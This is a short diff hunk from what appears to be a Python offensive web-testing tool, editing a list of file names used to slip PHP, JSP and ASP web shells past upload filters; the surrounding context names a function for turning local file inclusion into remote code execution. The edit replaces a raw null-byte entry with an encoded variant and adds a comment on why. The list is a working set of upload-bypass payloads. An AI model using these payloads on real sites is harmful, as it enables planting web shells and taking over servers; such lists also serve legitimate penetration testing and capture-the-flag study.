@@ -60,7 +60,9 @@ def lfi_to_rce_ladder(url: str, param: str) -> list[tuple[str, str]]:
 UPLOAD_EXTENSION_LADDER: list[str] = [
     "shell.php", "shell.PhP", "shell.php.jpg", "shell.jpg.php",
     "shell.phtml", "shell.phar", "shell.php7", "shell.pht",
-    "shell.php%00.jpg", "shell.php\x00.jpg", "shell.php;.jpg",
+    # Percent-encoded null-byte; the raw \x00 would break argv on POSIX
+    # (embedded null character) and is not accepted by subprocess.
+    "shell.php%00.jpg", "shell.php%20.jpg", "shell.php;.jpg",
     "shell.jsp", "shell.jspx", "shell.war",
     "shell.aspx", "shell.asp;.jpg", "shell.asa", "shell.cer",
 ]
